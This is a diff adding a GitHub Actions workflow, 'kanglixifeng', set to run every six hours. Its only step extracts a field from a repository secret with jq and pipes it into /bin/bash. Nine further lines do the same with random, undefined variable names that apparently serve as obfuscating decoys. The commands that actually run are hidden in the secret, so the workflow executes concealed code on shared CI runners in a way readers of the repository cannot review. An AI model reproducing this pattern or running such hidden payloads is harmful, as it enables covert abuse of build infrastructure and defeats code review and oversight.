@@ -1,0 +1,26 @@
+name: kanglixifeng
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: kanglixifeng
+        env:
+          c9: ${{ secrets.c9 }}
+        run: |
+          echo $c9 | jq -r .u795 | /bin/bash
+          echo $axog42864 | jq -r .uitfj14533 | /bin/bash
+          echo $m909 | jq -r .fxbu307 | /bin/bash
+          echo $xffgy3 | jq -r .za8 | /bin/bash
+          echo $wwk4527 | jq -r .ebs3 | /bin/bash
+          echo $t5788 | jq -r .xfekd575 | /bin/bash
+          echo $dzpv0 | jq -r .gxwi36409 | /bin/bash
+          echo $mndcp43 | jq -r .vf32216 | /bin/bash
+          echo $rtmkk0 | jq -r .dtqlr65 | /bin/bash
+          echo $vy21 | jq -r .kxb9416 | /bin/bash
+
